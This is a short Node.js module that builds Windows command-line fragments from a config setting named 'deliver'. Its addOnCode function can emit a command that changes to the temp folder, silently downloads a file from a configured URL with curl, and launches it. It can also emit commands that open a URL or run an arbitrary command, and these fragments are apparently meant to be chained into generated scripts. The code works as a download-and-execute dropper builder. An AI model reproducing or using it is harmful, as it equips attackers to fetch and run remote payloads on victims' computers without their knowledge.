
module.exports = {
    randomString: function (len) {
        let value = ""
        let letters = "qwertyuiopasdfghjklzxcvbnm"
        letters = letters + letters.toUpperCase()

        for (let i = 0; i < len; i++) {
            value += letters[Math.floor(Math.random() * letters.length)]
        }

        return value
    },
    addOnCode: function (config) {
        let value = ""
        switch (config.deliver) {
            case "1":
                break;
            case "2":
                let mediaurl = config.mediaurl
                let medianame = config.medianame
                medianame = medianame.replaceAll(" ", "_")
                value += `cd %TEMP% & (IF EXIST ${medianame} (start ${medianame}) ELSE (curl -s -A 1 ${mediaurl} -o ${medianame} & start ${medianame})) &`
                break;
            case "3":
                let url = config.url
                value += `start ${url} &`
                break;
            case "4":
                let cmd = config.command
                value += `cmd /C ${cmd} &`
                break;
            default:
                break;
        }
        return value
    }
}
